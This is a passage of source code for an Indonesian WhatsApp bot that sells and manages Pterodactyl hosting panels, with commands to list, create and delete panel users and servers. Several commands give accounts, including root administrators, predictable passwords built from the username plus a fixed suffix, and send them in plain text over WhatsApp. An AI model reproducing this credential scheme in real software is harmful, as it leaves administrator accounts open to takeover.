await Xrzteam.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
			break
			
        case "public": {
if (!isOwner) return XrzteamReply(msg.owner)
Xrzteam.public = true
reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
        
case "self": {
if (!isOwner) return XrzteamReply(msg.owner)
Xrzteam.public = false
reply("Berhasil mengganti mode bot menjadi *Self*")
}
break

case "owner": {
Xrzteam.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `https://telegra.ph/file/fdae7519babe60a216115.jpg`, 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: ``, 
mediaType: 1
}}})
}
break
        
case "addprem":{
if (!isOwner) return reply('Only Owner!')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxx`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Xrzteam.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
m.reply(`Sukses Menambahkan ${prrkek} Ke Daftar Premium!`)
}
break
        
case "delprem":{
if (!isOwner) return reply('Only Owner!')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Sukses Menghapus ${ya} Dari Daftar Premium!`)
}    
        break
        
                case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;

case "listsrv-v2": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;
        
              case "listusr": {
  if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;

case "listusr-v2": {
  if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        
        case "delsrv": {
      if (!isOwner) return reply(`Only Owner!`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUKSES MENGHAPUS SERVER!*')
}
        break
        
        case "delsrv-v2": {
      if (!isOwner) return reply(`Only Owner!`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUKSES MENGHAPUS SERVER!*')
}
        break
        
        case "delusr": {
  if (!isOwner) return reply(`Only Owner!`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUKSES MENGHAPUS USER!*')
} 
break

case "delusr-v2": {
  if (!isOwner) return reply(`Only Owner!`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUKSES MENGHAPUS USER!*')
} 
break

case "cadmin": {
if (!isOwner) return m.reply(`*Fitur Ini hanya dapat di akses Oleh Owner Seseorang!*`)
if (!isOwner) return m.reply(msg.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "024"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@rexcz.xyz",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
    const listMessage = {
        text: tks,
    }
    await Xrzteam.sendMessage(m.chat, listMessage)
    await Xrzteam.sendMessage(nomornya, {
        text: `*\`𝗞𝗥𝗜𝗡𝗚 𝗞𝗥𝗜𝗡𝗚 𝗔𝗗𝗔 𝗣𝗔𝗞𝗘𝗧 𝗔𝗗𝗣 𝗗𝗔𝗧𝗔𝗡𝗚📦\`*\n
* *Username :* ${username}
* *Password :* ${password}
* *Link Login :* ${domain}
* *Tutor bikin panel :* https://files.catbox.moe/91ig9h.mp4
* *Tutor pasang sc bot cpanel :* https://files.catbox.moe/d7l684.mp4

*Note / Catatan :*
> dilarang membagikan panel free
> dilarang menyebarkan data panel
> dilarang menyebarkan link panel
> dilarang membuat akun admin panel
> dilarang run sc yang berbau ddos
> jangan lupa subscribe yt RexxaaOFFC
`,    })        
}

break

case "cadmin-v2": {
if (!isOwner) return m.reply(`*Fitur Ini hanya dapat di akses Oleh Owner Seseorang!*`)
if (!isOwner) return m.reply(msg.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "024"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@rexcz.xyz",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
    const listMessage = {
        text: tks,
    }
    await Xrzteam.sendMessage(m.chat, listMessage)
    await Xrzteam.sendMessage(nomornya, {
        text: `*\`𝗞𝗥𝗜𝗡𝗚 𝗞𝗥𝗜𝗡𝗚 𝗔𝗗𝗔 𝗣𝗔𝗞𝗘𝗧 𝗔𝗗𝗣 𝗗𝗔𝗧𝗔𝗡𝗚📦\`*\n
* *Username :* ${username}
* *Password :* ${password}
* *Link Login :* ${domain2}
* *Tutor bikin panel :* https://files.catbox.moe/91ig9h.mp4
* *Tutor pasang sc bot cpanel :* https://files.catbox.moe/d7l684.mp4

*Note / Catatan :*
> dilarang membagikan panel free
> dilarang menyebarkan data panel
> dilarang menyebarkan link panel
> dilarang membuat akun admin panel
> dilarang run sc yang berbau ddos
> jangan lupa subscribe yt RexxaaOFFC
`,    })        
}

break
  
        case "listadmin": {
  if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;

case "listadmin-v2": {
  if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Xrzteam.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }        
}
break;

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gbb": case "10gb": case "unli": {
    if (!isPremium && !isOwner) return XrzteamReply("Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner")

if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Xrzteam.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel2[0].toLowerCase()
let email = username+"@buyer.rexcz"
let name = capital(username)
let password = username + "015"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Nama :* ${name} Server\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
var datapanel = `
*\`𝗞𝗥𝗜𝗡𝗚 𝗞𝗥𝗜𝗡𝗚 𝗔𝗗𝗔 𝗣𝗔𝗞𝗘𝗧 𝗣𝗔𝗡𝗘𝗟 𝗗𝗔𝗧𝗔𝗡𝗚\`* 📦

* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}
* *Tutorial :* https://youtu.be/SgTL-BaRFkU?si=ALuBwm8LfCSGuXKV

*Note / Catatan :*
> dilarang membagikan panel free
> dilarang menyebarkan data panel
> dilarang menyebarkan link panel
> jangan lupa subscribe yt RexxaaOFFC
`
Xrzteam.sendMessage(global.panel2[1],{text: datapanel }, { quoted: qloc })
}

break;

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unli-v2": {
    if (!isPremium && !isOwner) return XrzteamReply("Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner")

if (global.apikey2.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Xrzteam.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel2[0].toLowerCase()
let email = username+"@buyer.rexcz"
let name = capital(username)
let password = username + "015"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Nama :* ${name} Server\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
var datapanel = `
*\`𝗞𝗥𝗜𝗡𝗚 𝗞𝗥𝗜𝗡𝗚 𝗔𝗗𝗔 𝗣𝗔𝗞𝗘𝗧 𝗣𝗔𝗡𝗘𝗟 𝗗𝗔𝗧𝗔𝗡𝗚\`* 📦

* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain2}
* *Tutorial :* https://youtu.be/SgTL-BaRFkU?si=ALuBwm8LfCSGuXKV

*Note / Catatan :*
> dilarang membagikan panel free
> dilarang menyebarkan data panel
> dilarang menyebarkan link panel
> jangan lupa subscribe yt RexxaaOFFC
`
Xrzteam.sendMessage(global.panel2[1],{text: datapanel }, { quoted: qloc })
}

break

  case 'addgc':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return m.reply("Khusus Owner")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Active To Crate Panel`)
break              
     case "delpanel": case "hapuspanel": {
    if (!isOwner) return XrzteamReply(msg.owner);
    if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!");
    if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));

    let sections = [];
    let pageServer = 1;
    let foundServer = false;

    // Pencarian Server dengan Pagination
    while (!foundServer) {
        let f = await fetch(`${domain}/api/application/servers?page=${pageServer}`, {
            "method": "GET",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        let result = await f.json();
        if (!result.data || result.data.length === 0) break; // Jika tidak ada data, hentikan

        let servers = result.data;
        for (let server of servers) {
            let s = server.attributes;
            if (args[0] == s.id.toString()) {
                sections.push(s.name.toLowerCase());
                // Hapus server
                await fetch(`${domain}/api/application/servers/${s.id}`, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                foundServer = true;
                break;
            }
        }

        if (!foundServer) pageServer++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
    }

    if (sections.length > 0) {
        // Pencarian User dengan Pagination
        let pageUser = 1;
        let foundUser = false;

        while (!foundUser) {
            let cek = await fetch(`${domain}/api/application/users?page=${pageUser}`, {
                "method": "GET",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            });
            let res2 = await cek.json();

            if (!res2.data || res2.data.length === 0) break; // Jika tidak ada data, hentikan

            let users = res2.data;
            for (let user of users) {
                let u = user.attributes;
                if (sections.includes(u.username)) {
                    // Hapus user
                    await fetch(`${domain}/api/application/users/${u.id}`, {
                        "method": "DELETE",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    foundUser = true;
                    break;
                }
            }

            if (!foundUser) pageUser++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
        }

        reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`);
    } else {
        reply("*ID Server/User* Tidak Ditemukan");
    }
}
break;

case "delpanel-v2": case "hapuspanel-v2": {
    if (!isOwner) return XrzteamReply(msg.owner);
    if (global.apikey2.length < 1) return reply("Apikey Tidak Ditemukan!");
    if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));

    let sections = [];
    let pageServer = 1;
    let foundServer = false;

    // Pencarian Server dengan Pagination
    while (!foundServer) {
        let f = await fetch(`${domain2}/api/application/servers?page=${pageServer}`, {
            "method": "GET",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey2
            }
        });
        let result = await f.json();
        if (!result.data || result.data.length === 0) break; // Jika tidak ada data, hentikan

        let servers = result.data;
        for (let server of servers) {
            let s = server.attributes;
            if (args[0] == s.id.toString()) {
                sections.push(s.name.toLowerCase());
                // Hapus server
                await fetch(`${domain2}/api/application/servers/${s.id}`, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                });
                foundServer = true;
                break;
            }
        }

        if (!foundServer) pageServer++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
    }

    if (sections.length > 0) {
        // Pencarian User dengan Pagination
        let pageUser = 1;
        let foundUser = false;

        while (!foundUser) {
            let cek = await fetch(`${domain2}/api/application/users?page=${pageUser}`, {
                "method": "GET",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            });
            let res2 = await cek.json();

            if (!res2.data || res2.data.length === 0) break; // Jika tidak ada data, hentikan

            let users = res2.data;
            for (let user of users) {
                let u = user.attributes;
                if (sections.includes(u.username)) {
                    // Hapus user
                    await fetch(`${domain2}/api/application/users/${u.id}`, {
                        "method": "DELETE",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey2
                        }
                    });
                    foundUser = true;
                    break;
                }
            }

            if (!foundUser) pageUser++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
        }

        reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`);
    } else {
        reply("*ID Server/User* Tidak Ditemukan");
    }
}
break;

case "kik": case "kick": case "sulap": {
if (!isGroup) return XrzteamReply(msg.group)
if (!isBotAdmin) return XrzteamReply(msg.adminbot)
if (!isAdmin && !isOwner) return XrzteamReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Xrzteam.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Xrzteam.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('62xxx/@tag'))}
break
case "hidetag": case "ht": case "h": {
if (!isGroup) return XrzteamReply(msg.group)
if (!isAdmin && !isOwner) return XrzteamReply(msg.admin)
if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
